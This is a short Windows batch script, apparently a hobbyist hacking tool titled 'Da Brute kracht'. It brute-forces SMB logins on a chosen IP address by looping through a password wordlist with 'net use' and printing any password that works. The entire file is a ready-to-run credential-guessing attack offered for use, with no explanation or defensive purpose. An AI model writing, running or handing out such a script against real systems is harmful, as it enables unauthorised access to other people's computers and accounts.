@echo off
title Da Brute kracht 
@mode 80, 40
chcp 65001 >nul
cls
echo.		
echo [31m BBBBB   RRRRR   U   U   U   U   TTTTT	DDDDD        AAA      DDDDDD     DDDDDD     YY    YY
echo [31m B   B   R   R   U   U   U   U     T  	DD   DD     AA AA     DD    DD   DD    DD    YY  YY
echo [37m BBBBB   RRRRR   U   U   U   U     T  	DD     DD  AA   AA    DD     DD  DD     DD     YY
echo [37m B   B   R  R    U   U   U   U     T  	DD    DD  AAAAAAAAA   DD    DD   DD    DD      YY
echo [34m BBBBB   R   R    UUU     UUU      T  	DDDDD	 AA       AA  DDDDDD     DDDDDD	        YY

echo. 
echo.
echo.
echo. [34m Made by DrJunkHoofd

set /p ip="[96m [Enter IP Address]:[92m "
set /p user="[96m [Enter Username]:[92m "
set /p list="[96m [Enter Wordlist]:[92m "

set /a count=1

for /f %%a in (%list%) do (
  set pass=%%a
  call :a
)
echo [91m Password Not Found [0m
pause 
exit 

:success
echo [92m Password Found!:[95m %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:a
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [93m[ATTEMPT %count%]: [91m[%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success

